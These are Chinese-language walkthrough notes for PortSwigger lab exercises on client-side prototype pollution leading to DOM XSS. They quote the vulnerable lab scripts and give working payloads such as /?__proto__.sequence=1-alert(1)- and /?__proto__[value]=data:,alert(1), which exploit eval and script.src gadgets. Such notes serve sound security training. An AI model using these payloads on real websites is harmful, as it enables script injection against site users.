实验：通过替代原型污染向量进行 DOM XSS
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector

手动检查：
在url中添加
```/?__proto__[foo]=bar```
在浏览器控制台中输入
Object.prototype.foo
显示
undefined 

在url中添加
```/?__proto__.foo=bar```
此时的控制台返回
bar
发现源


查看页面加载的脚本
GET /resources/js/searchLoggerAlternative.js HTTP/2
内容为
```javascript
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```
此处的潜在工具为 manager.sequence，之后传递到 eval 执行
构造内容为字符串
/?__proto__.sequence=1-alert(1)-

在
manager.sequence = a + 1;
后，得到
sequence="1-alert(1)-1"

示例解决方案：alert前不必添加前缀
> sequence=alert(1)-

https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization


手动检查：

加载的脚本
GET /resources/js/searchLoggerFiltered.js 
内容为
```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

config.transport_url
脚本采用迭代净化

## 通过浏览器 API 进行原型污染 & 通过 Object.defineProperty() 引入原型污染

通过浏览器 API 进行客户端原型污染
https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
关联重复文章
广泛的原型污染小工具
https://portswigger.net/research/widespread-prototype-pollution-gadgets


加载的脚本
GET /resources/js/searchLoggerFiltered.js 
内容为
```javascript
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```
汇为 config.transport_url，按照说明设置value值来应对 Object.defineProperty() 的过滤
/?__proto__[value]=data:,alert(1)
